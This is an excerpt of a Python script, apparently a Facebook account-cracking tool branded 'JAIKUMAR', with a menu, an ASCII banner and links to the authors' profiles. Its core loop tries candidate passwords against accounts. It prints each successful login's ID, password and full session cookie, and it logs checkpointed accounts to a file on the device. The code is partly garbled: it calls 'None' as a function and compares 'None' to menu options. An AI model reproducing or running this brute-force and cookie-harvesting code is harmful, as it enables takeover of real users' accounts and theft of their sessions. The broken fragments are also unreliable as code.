...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLW MY FRIEND ID')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/profile.php?id=100038665662648')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY FB')
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100038665662648')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100038665662648')
        return None
...
\033[1;32m       
           ...
           8 8888   d888888o. 8888888 8888888888 
           8 8888 .`8888:' `88.     8 8888       
           8 8888 8.`8888.   Y8     8 8888       
           8 8888 `8.`8888.         8 8888       
           8 8888  `8.`8888.        8 8888       
           8 8888   `8.`8888.       8 8888       
88.        8 8888    `8.`8888.      8 8888       
`88.       8 888'8b   `8.`8888.     8 8888       
  `88o.    8 88' `8b.  ;8.`8888     8 8888       
    `Y888888 '    `Y8888P ,88P'     8 8888\033[1;37m================= \33[32;45mJAIKUMAR\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mTAJ\33[0;m\033[1;32m && \033[1;33mSADDAM\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m TAJ GUL × SADDAM CHANDIO
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-JKING
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mJKING
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mJAIKUMAR\33[0;m =====================
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(JAIKUMAR-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(JAIKUMAR-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JAIKUMAR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
